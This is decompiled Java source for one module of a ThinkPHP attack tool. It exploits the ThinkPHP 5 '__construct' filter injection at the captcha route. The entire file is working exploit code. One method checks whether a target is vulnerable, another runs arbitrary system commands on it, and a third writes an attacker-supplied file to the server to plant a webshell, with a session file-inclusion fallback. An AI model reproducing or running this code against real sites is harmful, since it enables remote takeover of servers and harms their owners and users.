/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.io.UnsupportedEncodingException;
/*    */ import java.net.URLEncoder;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.util.Base64;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_construct_code_exec_4
/*    */   implements BaseExp {
/* 15 */   private String results = null;
/* 16 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 20 */     url = url + "/index.php?s=captcha";
/* 21 */     String payload = "aaaa=dylan&_method=__construct&method=GET&filter[]=var_dump";
/* 22 */     Response response = HttpTool.post(url, payload, this.property);
/* 23 */     if (response.getText().contains("string(5) \"dylan\"")) {
/* 24 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 25 */       return this.results;
/*    */     } 
/* 27 */     if (response.getError() != null) {
/* 28 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 29 */       return this.results;
/*    */     } 
/* 31 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 32 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 37 */     url = url + "/index.php?s=captcha";
/* 38 */     String payload = "aaaa=" + cmd + "&_method=__construct&method=GET&filter[]=system";
/* 39 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 40 */     Response response = HttpTool.post(url, payload, this.property);
/* 41 */     if (response.getError() == null) {
/* 42 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 44 */       this.results = response.getError();
/*    */     } 
/* 46 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/*    */     try {
/* 52 */       String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
/* 53 */       content = URLEncoder.encode(base64Content, "UTF-8");
/* 54 */       String payload = "s=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=__construct&method=POST&filter[]=assert";
/* 55 */       this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 56 */       Response response = HttpTool.post(url + "/index.php?s=captcha", payload, this.property);
/* 57 */       if (response.getError() == null) {
/* 58 */         this.property.clear();
/* 59 */         response = HttpTool.get(url + "/" + fileName, this.property);
/* 60 */         if (response.getCode() == 200) {
/* 61 */           this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 62 */           return this.results;
/*    */         } 
/*    */       } 
/* 65 */       tp5_session_fi_getshell tp5sfg = new tp5_session_fi_getshell();
/* 66 */       this.results = tp5sfg.getshell(url, "/index.php?s=captcha", fileName, base64Content);
/* 67 */     } catch (UnsupportedEncodingException e) {
/* 68 */       this.results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 70 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_construct_code_exec_4.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */